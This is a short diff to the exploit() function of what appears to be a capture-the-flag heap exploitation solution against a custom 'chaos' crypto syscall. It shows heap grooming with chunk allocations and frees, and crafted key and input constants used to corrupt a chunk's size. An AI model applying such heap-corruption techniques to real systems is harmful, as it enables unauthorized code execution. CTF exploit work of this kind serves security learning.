@@ -41,17 +41,20 @@ static void exploit(void)
     // exhaust 0x20 chunks
     uint32_t _a = alloc_chr('a', 0x18);
 
-    uint32_t key1 = alloc_chr('k', 32);
-    uint32_t key2 = alloc_chr('K', 32);
+    uint32_t key1 = alloc_chr(0, 32);
+    uint64_t k2[4] = {1, 0, 0, 0};
+    uint32_t key2 = syscall(SYS_chaos_crypto, CHAOS_ALGO_REG_KEY, PACK(k2, sizeof(k2)));
     uint32_t c = alloc_chr('c', 0x18);
     freeh(c);
-    uint8_t in[0x18];
-    memset(in, 'i', sizeof(in));
+    uint64_t in[3] = {0x774157aeu, 0, 0};
     uint32_t d = alloc_chr('d', 0x18);
     uint32_t e = alloc_chr('e', 0x18);
     freeh(d);
     freeh(e);
     syscall(SYS_chaos_crypto, CHAOS_ALGO_FFF_ENC, PACK(&in, 0x18), PACK(0x1000, 0x18), key1);
+    in[0] = 0x62bf50a402c580eeull;
+    in[1] = 0xf6261456ada1476bull;
+    in[2] = 0xa4bae6caca57f61ull;
     // size cracked, don't free this
     uint32_t crack = alloc_chr('a', 0x38);
     syscall(SYS_chaos_crypto, CHAOS_ALGO_FFF_ENC, PACK(&in, 0x18), PACK(0x1000, 0x18), key2);
